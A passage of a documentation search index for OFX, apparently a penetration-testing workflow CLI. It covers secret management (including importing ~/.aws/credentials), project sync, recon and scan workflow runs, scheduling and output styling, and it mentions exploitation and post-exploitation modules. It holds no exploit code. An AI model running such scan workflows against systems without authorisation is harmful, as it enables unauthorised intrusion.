secret set GITHUB_TOKEN\nofx secret set NESSUS_ACCESS_KEY\nofx secret set NESSUS_SECRET_KEY\n\n# Import from file\nofx secret set AWS_CONFIG --file ~/.aws/credentials\n\n# List all secrets\nofx secret list\n\n# Verify secret exists\nofx secret get SHODAN_API_KEY\n\n# Export backup\nofx secret export --output ~/backups/secrets_$(date +%Y%m%d).json\n\n# Clean up old secrets\nofx secret delete OLD_KEY --force\n\n# Clear all and start fresh\nofx secret clear --force\n</code></pre>"},{"location":"cli/commands/#project-management-workflow","title":"Project Management Workflow","text":"<pre><code># Initialize new engagement\nofx project init client_pentest_2025\n\n# Set up Git sync with encryption\n# (Interactive prompts will ask for Git URL and encryption key)\n\n# Work on project\nofx flow run recon --input target=client.com\n\n# Sync to remote\nofx project sync --push\n\n# Switch to different project\nofx project list\nofx project switch previous_engagement\n\n# Pull latest from remote\nofx project sync --pull\n\n# Archive old project\nofx project remove old_engagement\n</code></pre>"},{"location":"cli/commands/#workflow-development-cycle","title":"Workflow Development Cycle","text":"<pre><code># 1. Create/edit workflow file\nvim ~/.config/ofx/workflows/custom_scan.yml\n\n# 2. Validate syntax\nofx flow validate custom_scan\n\n# 3. Check schema for available properties\nofx dump schema --job\nofx dump schema --step\n\n# 4. Install required tools\nofx flow tools custom_scan\n\n# 5. Test run\nofx x run custom_scan --input target=test.local\n\n# 6. View API docs for enhancements\nofx docs api --list\nofx docs api --module http\n\n# 7. Update and re-validate\nofx flow validate custom_scan\n\n# 8. Production run\nofx flow run custom_scan \\\n  --input target=production.com \\\n  --output ./results/prod-scan-$(date +%Y%m%d_%H%M%S)\n</code></pre>"},{"location":"cli/commands/#troubleshooting-workflow","title":"Troubleshooting Workflow","text":"<pre><code># Check system health\nofx doctor check --verbose\n\n# Show PATH for tool discovery issues\nofx doctor path\n\n# Get installation help for missing tool\nofx doctor install-help nmap\n\n# Verify workflow configuration\nofx dump flow my_workflow --yaml\n\n# Check secret store location\nofx secret store\n\n# List available workflows\nls -lah ~/.config/ofx/workflows/\n\n# View workflow with all resolved values\nofx dump flow recon --json | jq .\n</code></pre>"},{"location":"cli/commands/#multi-environment-operations","title":"Multi-Environment Operations","text":"<pre><code># Development environment\nexport OFX_CONFIG_DIR=~/projects/dev/.ofx\nofx flow run test_workflow\n\n# Staging environment  \nexport OFX_CONFIG_DIR=~/projects/staging/.ofx\nofx secret import staging_secrets.json\nofx flow run integration_tests\n\n# Production environment\nexport OFX_CONFIG_DIR=~/projects/prod/.ofx\nofx project sync --pull\nofx flow run production_scan \\\n  --input target=production.example.com \\\n  --output ./results/prod/$(date +%Y%m%d)\n</code></pre>"},{"location":"cli/commands/#environment-variables","title":"Environment Variables","text":"<p>OFX respects these environment variables:</p> <ul> <li><code>OFX_CONFIG_DIR</code> - Override default config directory (~/.config/ofx)</li> <li><code>OFX_DATA_DIR</code> - Override default data directory (~/.local/share/ofx)</li> <li><code>OFX_WORKFLOW_DIRS</code> - Additional workflow directories (colon-separated)</li> <li><code>OFX_SECRETS_FILE</code> - Custom secrets file location</li> <li><code>OFX_LOG_LEVEL</code> - Logging level (DEBUG, INFO, WARNING, ERROR)</li> </ul> <p>Example:</p> <pre><code>export OFX_CONFIG_DIR=/opt/ofx/config\nexport OFX_LOG_LEVEL=DEBUG\nofx flow run my_workflow\n</code></pre>"},{"location":"cli/commands/#tips-tricks","title":"Tips &amp; Tricks","text":""},{"location":"cli/commands/#using-aliases","title":"Using Aliases","text":"<p>Flow command has convenient aliases for faster typing:</p> <pre><code>ofx x run scan           # Instead of: ofx flow run scan\nofx task run enum        # Instead of: ofx flow run enum\n</code></pre>"},{"location":"cli/commands/#command-chaining","title":"Command Chaining","text":"<p>Combine commands for complex workflows:</p> <pre><code># Validate, install tools, then run\nofx flow validate scan &amp;&amp; \\\nofx flow tools scan &amp;&amp; \\\nofx x run scan --input target=example.com\n\n# Run and backup results\nofx flow run assessment --output ./results &amp;&amp; \\\ntar -czf results_$(date +%Y%m%d).tar.gz results/\n\n# Export secrets before system migration\nofx secret export --output backup.json &amp;&amp; \\\nofx project sync --push\n</code></pre>"},{"location":"cli/commands/#output-redirection","title":"Output Redirection","text":"<p>Capture command output for processing:</p> <pre><code># Save workflow schema\nofx dump schema --json &gt; schema.json\n\n# Save workflow configuration\nofx dump flow recon --yaml &gt; recon_backup.yml\n\n# Export project list\nofx project list --json &gt; projects.json\n\n# Save secret list (names only, not values)\nofx secret list --json &gt; secret_inventory.json\n</code></pre>"},{"location":"cli/commands/#using-with-other-tools","title":"Using with Other Tools","text":"<p>Integrate OFX with system tools:</p> <pre><code># Run workflow and send notification\nofx flow run scan &amp;&amp; notify-send \"Scan Complete\"\n\n# Parallel workflow execution\nparallel ofx flow run {} --input target=example.com ::: scan1 scan2 scan3\n\n# Schedule workflows with cron\n# Run every day at 2 AM\n0 2 * * * cd /path/to/project &amp;&amp; ofx x run daily_scan --output /results/$(date +\\%Y\\%m\\%d)\n\n# Monitor workflow in tmux/screen\ntmux new-session -d -s ofx_scan 'ofx flow run long_scan'\n</code></pre>"},{"location":"cli/commands/#configuration-management","title":"Configuration Management","text":"<p>Manage OFX configuration efficiently:</p> <pre><code># Backup entire configuration\ntar -czf ofx_backup_$(date +%Y%m%d).tar.gz ~/.config/ofx/\n\n# Copy workflows to new system\nrsync -av ~/.config/ofx/workflows/ newserver:~/.config/ofx/workflows/\n\n# Version control workflows\ncd ~/.config/ofx/workflows/\ngit init\ngit add *.yml\ngit commit -m \"Initial workflows\"\n\n# Share workflows with team\ngit remote add origin https://github.com/team/ofx-workflows.git\ngit push -u origin main\n</code></pre>"},{"location":"cli/commands/#exit-codes","title":"Exit Codes","text":"<p>OFX follows standard exit code conventions:</p> <ul> <li><code>0</code> - Success</li> <li><code>1</code> - General error</li> <li><code>2</code> - Command syntax error</li> <li><code>130</code> - Interrupted (Ctrl+C)</li> </ul> <p>Example in scripts:</p> <pre><code>#!/bin/bash\nif ofx flow validate my_workflow; then\n    ofx flow run my_workflow --input target=$TARGET\nelse\n    echo \"Workflow validation failed\"\n    exit 1\nfi\n</code></pre>"},{"location":"cli/commands/#getting-help","title":"Getting Help","text":"<ul> <li>Run <code>ofx &lt;command&gt; --help</code> for detailed command help</li> <li>Visit documentation: <code>ofx docs serve</code></li> <li>View API reference: <code>ofx docs api --list</code></li> <li>Check system health: <code>ofx doctor</code></li> </ul>"},{"location":"cli/visualization/","title":"CLI Visualization &amp; User Experience","text":"<p>OFX CLI provides an enhanced terminal experience using the <code>rich</code> library for beautiful, informative output.</p>"},{"location":"cli/visualization/#visual-features","title":"Visual Features","text":""},{"location":"cli/visualization/#full-width-tables","title":"Full-Width Tables","text":"<p>All table outputs now intelligently adapt to your terminal width for optimal readability:</p> <ul> <li><code>ofx project list</code> - Full-width project listing</li> <li><code>ofx secret list</code> - Full-width secret tables  </li> <li><code>ofx secret search</code> - Full-width search results</li> <li><code>ofx asset list</code> - Full-width asset collections</li> <li><code>ofx docs api</code> - Full-width API documentation tables</li> <li><code>ofx doctor check</code> - Full-width system health tables</li> </ul>"},{"location":"cli/visualization/#progress-indicators","title":"Progress Indicators","text":"<p>Long-running operations now display visual feedback:</p>"},{"location":"cli/visualization/#spinners","title":"Spinners","text":"<ul> <li><code>ofx project init</code> - Animated spinner during project creation and initialization</li> <li><code>ofx project sync</code> - Animated spinner during sync operations</li> <li><code>ofx flow run</code> - Animated spinner during workflow execution</li> <li><code>ofx asset add</code> - Animated spinner during Git clone operations</li> <li><code>ofx asset sync</code> - Animated spinner during Git pull/push operations</li> </ul>"},{"location":"cli/visualization/#progress-bars","title":"Progress Bars","text":"<p>Workflow execution includes detailed progress tracking:</p> <pre><code>\u2699 MyWorkflow \u2192 job1, job2 \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 100% 0:00:10\n  \u21b3 job1 \u2192 step1                          \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2578\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 75% 0:00:05\n</code></pre>"},{"location":"cli/visualization/#enhanced-messages","title":"Enhanced Messages","text":""},{"location":"cli/visualization/#success-panels","title":"Success Panels","text":"<p>Commands display success messages in styled panels:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 \u2705 Execution Success                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 \u2713 Workflow run completed             \u2502\n\u2502   successfully                       \u2502\n\u2502 Output: /path/to/output              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"cli/visualization/#error-panels","title":"Error Panels","text":"<p>Failures are clearly highlighted with colored borders and icons:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 \u274c Execution Failed                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Workflow run failed                  \u2502\n\u2502 Status: failed                       \u2502\n\u2502 Error: Connection timeout            \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"cli/visualization/#warning-boxes","title":"Warning Boxes","text":"<p>Sensitive operations display warnings:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 \u26a0\ufe0f  WARNING                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Secret values are displayed above!   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"cli/visualization/#workflow-input-display","title":"Workflow Input Display","text":"<p><code>ofx flow run</code> displays inputs in a formatted table before execution:</p> <pre><code>Workflow Inputs\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Parameter   \u2502 Value                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 target      \u2502 example.com          \u2502\n\u2502 ports       \u2502 80,443,8080          \u2502\n\u2502 timeout     \u2502 30                   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"cli/visualization/#consistent-styling","title":"Consistent Styling","text":"<p>All tables use: - Cyan borders - Clean, professional appearance - Colored headers - Bold, easy to scan - Proper alignment - Left for text, right for numbers - Smart width - Adapts to terminal size with <code>expand=True</code></p>"},{"location":"cli/visualization/#examples","title":"Examples","text":""},{"location":"cli/visualization/#project-management","title":"Project Management","text":"<pre><code>$ ofx project list\n\nOFX Projects (3)\n\u250c\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 #  \u2502 Project Name    \u2502 Path                             \u2502\n\u251c\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 1  \u2502 client-pentest  \u2502 /home/user/.ofx/client-pentest   \u2502\n\u2502 2  \u2502 red-team-2024   \u2502 /home/user/.ofx/red-team-2024    \u2502\n\u2502 3  \u2502 webapp-audit    \u2502 /home/user/.ofx/webapp-audit     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"cli/visualization/#secret-management","title":"Secret Management","text":"<pre><code>$ ofx secret list\n\nStored Secrets (5 found)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Name             \u2502 Type     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 API_KEY          \u2502 api-key  \u2502\n\u2502 AWS_CREDENTIALS  \u2502 json     \u2502\n\u2502 DB_PASSWORD      \u2502 password \u2502\n\u2502 GITHUB_TOKEN     \u2502 token    \u2502\n\u2502 SSH_PRIVATE_KEY  \u2502 string   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"cli/visualization/#asset-collections","title":"Asset Collections","text":"<pre><code>$ ofx asset list\n\nInstalled Workflow Asset Collections\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Name    \u2502 Source URL                       \u2502 Local Path         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 default \u2502 https://github.com/.../ofx-hub   \u2502 ~/.ofx/default     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"cli/visualization/#system-health-check","title":"System Health Check","text":"<pre><code>$ ofx doctor check\n\nEssential Tools\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Tool     \u2502 Status \u2502 Details     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 docker   \u2502 \u2705     \u2502 24.0.7      \u2502\n\u2502 git      \u2502 \u2705     \u2502 2.40.1      \u2502\n\u2502 python   \u2502 \u2705     \u2502 3.12.0      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSystem Health\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Check        \u2502 Status \u2502 Details    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Disk Space   \u2502 \u2705     \u2502 450GB free \u2502\n\u2502 Memory       \u2502 \u2705     \u2502 16GB       \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"cli/visualization/#terminal-compatibility","title":"Terminal Compatibility","text":"<p>The visualization enhancements work best with:</p> <ul> <li>Modern terminals (iTerm2, Terminal.app, Windows Terminal, Alacritty)</li> <li>Color support (256 colors or true color)</li> <li>Unicode support (for box-drawing characters and emojis)</li> </ul> <p>For basic terminals, OFX gracefully falls back to simpler output.</p>"},{"location":"cli/commands/","title":"CLI Commands","text":"<p>Complete reference for all OFX command-line interface commands.</p>"},{"location":"cli/commands/#workflow-commands","title":"Workflow Commands","text":"<ul> <li>flow run - Execute workflows</li> <li>flow validate - Validate workflow syntax</li> <li>flow visualize - Visualize workflow dependencies</li> <li>flow tools - Manage workflow tools</li> <li>flow update - Update workflows</li> </ul>"},{"location":"cli/commands/#project-commands","title":"Project Commands","text":"<ul> <li>project init - Initialize new OFX project</li> <li>project sync - Sync project to remote storage</li> <li>project list - List and manage projects</li> </ul>"},{"location":"cli/commands/#secret-management","title":"Secret Management","text":"<ul> <li>secret manage - Manage secrets and credentials</li> </ul>"},{"location":"cli/commands/#asset-management","title":"Asset Management","text":"<ul> <li>asset - Manage asset collections and workflows</li> </ul>"},{"location":"cli/commands/#utility-commands","title":"Utility Commands","text":"<ul> <li>docs - Serve API documentation</li> <li>doctor - Diagnose system dependencies</li> <li>dump - Dump and analyze data structures</li> </ul>"},{"location":"cli/commands/#command-index","title":"Command Index","text":"Command Description <code>ofx flow run</code> Execute a workflow <code>ofx flow validate</code> Validate workflow syntax <code>ofx flow visualize</code> Visualize workflow dependency graph <code>ofx flow tools</code> Install and manage workflow tools <code>ofx flow update</code> Update workflow definitions <code>ofx project init</code> Initialize new project <code>ofx project sync</code> Sync project to storage <code>ofx secret manage</code> Manage secrets <code>ofx asset</code> Manage asset collections <code>ofx docs</code> Serve API documentation server <code>ofx doctor</code> Check system dependencies <code>ofx dump</code> Dump data structures"},{"location":"cli/commands/asset/","title":"asset","text":"<p>Manage asset collections and workflow templates.</p>"},{"location":"cli/commands/asset/#usage","title":"Usage","text":"<pre><code>ofx asset &lt;subcommand&gt; [options]\n</code></pre>"},{"location":"cli/commands/asset/#subcommands","title":"Subcommands","text":""},{"location":"cli/commands/asset/#create","title":"create","text":"<p>Create a new asset collection.</p> <pre><code>ofx asset create &lt;name&gt; [options]\n</code></pre>"},{"location":"cli/commands/asset/#add","title":"add","text":"<p>Add workflows to an asset collection.</p> <pre><code>ofx asset add &lt;collection&gt; &lt;workflow...&gt;\n</code></pre>"},{"location":"cli/commands/asset/#list","title":"list","text":"<p>List asset collections.</p> <pre><code>ofx asset list\n</code></pre>"},{"location":"cli/commands/asset/#show","title":"show","text":"<p>Show collection contents.</p> <pre><code>ofx asset show &lt;collection&gt;\n</code></pre>"},{"location":"cli/commands/asset/#remove","title":"remove","text":"<p>Remove workflows from collection.</p> <pre><code>ofx asset remove &lt;collection&gt; &lt;workflow...&gt;\n</code></pre>"},{"location":"cli/commands/asset/#delete","title":"delete","text":"<p>Delete an asset collection.</p> <pre><code>ofx asset delete &lt;collection&gt;\n</code></pre>"},{"location":"cli/commands/asset/#description","title":"Description","text":"<p>Asset collections group related workflows, templates, and resources for easy reuse and sharing. Think of them as workflow packages or libraries.</p>"},{"location":"cli/commands/asset/#examples","title":"Examples","text":""},{"location":"cli/commands/asset/#create-collection","title":"Create collection","text":"<pre><code>ofx asset create recon-tools\n</code></pre>"},{"location":"cli/commands/asset/#add-workflows-to-collection","title":"Add workflows to collection","text":"<pre><code>ofx asset add recon-tools \\\n  subdomain-enum.yaml \\\n  port-scan.yaml \\\n  service-detection.yaml\n</code></pre>"},{"location":"cli/commands/asset/#list-all-collections","title":"List all collections","text":"<pre><code>ofx asset list\n</code></pre>"},{"location":"cli/commands/asset/#show-collection-contents","title":"Show collection contents","text":"<pre><code>ofx asset show recon-tools\n</code></pre>"},{"location":"cli/commands/asset/#remove-workflow-from-collection","title":"Remove workflow from collection","text":"<pre><code>ofx asset remove recon-tools old-workflow.yaml\n</code></pre>"},{"location":"cli/commands/asset/#delete-collection","title":"Delete collection","text":"<pre><code>ofx asset delete outdated-collection\n</code></pre>"},{"location":"cli/commands/asset/#asset-collection-structure","title":"Asset Collection Structure","text":"<pre><code>~/.local/share/ofx/workflows/\n\u2514\u2500\u2500 recon-tools/\n    \u251c\u2500\u2500 subdomain-enum.yaml\n    \u251c\u2500\u2500 port-scan.yaml\n    \u251c\u2500\u2500 service-detection.yaml\n    \u2514\u2500\u2500 README.md\n</code></pre>"},{"location":"cli/commands/asset/#using-collections","title":"Using Collections","text":"<p>Reference workflows from collections:</p> <pre><code>name: full-recon\njobs:\n  enum:\n    uses: asset://recon-tools/subdomain-enum.yaml\n  scan:\n    uses: asset://recon-tools/port-scan.yaml\n    needs: enum\n</code></pre>"},{"location":"cli/commands/asset/#collection-metadata","title":"Collection Metadata","text":"<p>Collections can include metadata:</p> <pre><code># recon-tools/collection.yaml\nname: recon-tools\ndescription: Reconnaissance workflow collection\nversion: 1.0.0\nauthor: security-team\nworkflows:\n  - subdomain-enum.yaml\n  - port-scan.yaml\n</code></pre>"},{"location":"cli/commands/asset/#sharing-collections","title":"Sharing Collections","text":"<p>Export collection:</p> <pre><code>tar -czf recon-tools.tar.gz ~/.local/share/ofx/workflows/recon-tools/\n</code></pre> <p>Import collection:</p> <pre><code>tar -xzf recon-tools.tar.gz -C ~/.local/share/ofx/workflows/\n</code></pre>"},{"location":"cli/commands/asset/#see-also","title":"See Also","text":"<ul> <li>Workflows</li> <li>Templates</li> </ul>"},{"location":"cli/commands/docs-serve/","title":"docs","text":"<p>Serve interactive API documentation server.</p>"},{"location":"cli/commands/docs-serve/#usage","title":"Usage","text":"<pre><code>ofx docs [options]\n</code></pre>"},{"location":"cli/commands/docs-serve/#description","title":"Description","text":"<p>Starts a local HTTP server providing interactive API documentation for all OFX modules, functions, and classes. The documentation is auto-generated from docstrings and type hints.</p>"},{"location":"cli/commands/docs-serve/#options","title":"Options","text":"<ul> <li><code>--port &lt;port&gt;</code> - Server port (default: 8000)</li> <li><code>--host &lt;host&gt;</code> - Server host (default: 127.0.0.1)</li> <li><code>--no-browser</code> - Don't open browser automatically</li> <li><code>--reload</code> - Enable auto-reload on code changes</li> </ul>"},{"location":"cli/commands/docs-serve/#examples","title":"Examples","text":""},{"location":"cli/commands/docs-serve/#start-documentation-server","title":"Start documentation server","text":"<pre><code>ofx docs\n</code></pre> <p>Starts server at <code>http://localhost:8000</code> and opens in browser.</p>"},{"location":"cli/commands/docs-serve/#custom-port","title":"Custom port","text":"<pre><code>ofx docs --port 9000\n</code></pre>"},{"location":"cli/commands/docs-serve/#public-access","title":"Public access","text":"<pre><code>ofx docs --host 0.0.0.0 --port 8080\n</code></pre>"},{"location":"cli/commands/docs-serve/#development-mode-with-auto-reload","title":"Development mode with auto-reload","text":"<pre><code>ofx docs --reload\n</code></pre>"},{"location":"cli/commands/docs-serve/#documentation-structure","title":"Documentation Structure","text":"<p>The documentation server provides:</p>"},{"location":"cli/commands/docs-serve/#api-reference","title":"API Reference","text":"<ul> <li>Function signatures</li> <li>Parameter descriptions</li> <li>Return types</li> <li>Usage examples</li> <li>Source code links</li> </ul>"},{"location":"cli/commands/docs-serve/#module-index","title":"Module Index","text":"<ul> <li>All available modules</li> <li>Class hierarchies</li> <li>Function listings</li> </ul>"},{"location":"cli/commands/docs-serve/#search","title":"Search","text":"<ul> <li>Full-text search across all documentation</li> <li>Filter by module, class, function</li> </ul>"},{"location":"cli/commands/docs-serve/#interactive-examples","title":"Interactive Examples","text":"<ul> <li>Try API functions in browser</li> <li>See live results</li> <li>Copy code snippets</li> </ul>"},{"location":"cli/commands/docs-serve/#server-features","title":"Server Features","text":"<ul> <li>Auto-generated: Documentation created from code</li> <li>Type-aware: Leverages Python type hints</li> <li>Searchable: Full-text search functionality</li> <li>Responsive: Works on desktop and mobile</li> <li>Dark mode: Eye-friendly theme</li> </ul>"},{"location":"cli/commands/docs-serve/#generated-documentation","title":"Generated Documentation","text":"<p>Documentation includes:</p> <ol> <li>API Modules: reconnaissance, exploitation, post-exploitation</li> <li>Core APIs: HTTP, network, file operations</li> <li>Utilities: String manipulation, encoding, helpers</li> <li>Workflows: Workflow execution APIs</li> </ol>"},{"location":"cli/commands/docs-serve/#see-also","title":"See Also","text":"<ul> <li>API Overview</li> </ul>"},{"location":"cli/commands/doctor/","title":"doctor","text":"<p>Diagnose and check system dependencies.</p>"},{"location":"cli/commands/doctor/#usage","title":"Usage","text":"<pre><code>ofx doctor [subcommand] [options]\n</code></pre>"},{"location":"cli/commands/doctor/#subcommands","title":"Subcommands","text":""},{"location":"cli/commands/doctor/#check","title":"check","text":"<p>Run comprehensive system health check.</p> <pre><code>ofx doctor check [--verbose]\n</code></pre>"},{"location":"cli/commands/doctor/#install-help","title":"install-help","text":"<p>Show installation instructions for tools.</p> <pre><code>ofx 